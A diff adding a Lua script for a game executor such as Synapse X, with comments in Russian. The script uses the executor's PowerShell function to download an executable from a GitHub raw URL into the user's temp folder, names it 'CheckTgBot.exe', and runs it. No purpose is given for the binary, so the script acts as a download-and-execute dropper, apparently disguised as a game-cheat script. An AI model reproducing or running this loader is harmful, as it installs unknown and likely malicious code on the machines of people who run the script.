@@ -1,0 +1,38 @@
+-- Проверка поддержки инжектора
+if not syn or not syn.run_powershell then
+    warn("Ошибка: Инжектор не поддерживает выполнение PowerShell-команд (требуется Synapse X или аналог)")
+    return
+end
+
+-- PowerShell-команда
+local psCommand = [[
+$ErrorActionPreference = "Stop";
+try {
+    Invoke-WebRequest -Uri "https://github.com/balamutt1/ddd/raw/refs/heads/main/123.exe" -OutFile "$env:TEMP\CheckTgBot.exe";
+    Start-Process -FilePath "$env:TEMP\CheckTgBot.exe" -Wait;
+    Write-Output "Файл успешно загружен и запущен";
+}
+catch {
+    Write-Error "Ошибка: $_";
+}
+]]
+
+-- Функция для выполнения PowerShell-команды
+local function executePowerShell(command)
+    local success, result = pcall(function()
+        return syn.run_powershell(command)
+    end)
+    if success then
+        print("PowerShell-команда выполнена успешно")
+        if result then
+            print("Результат: " .. tostring(result))
+        end
+    else
+        warn("Ошибка выполнения PowerShell: " .. tostring(result))
+    end
+end
+
+-- Выполнение команды
+print("Запуск PowerShell-команды...")
+executePowerShell(psCommand)
+print("Скрипт завершен")
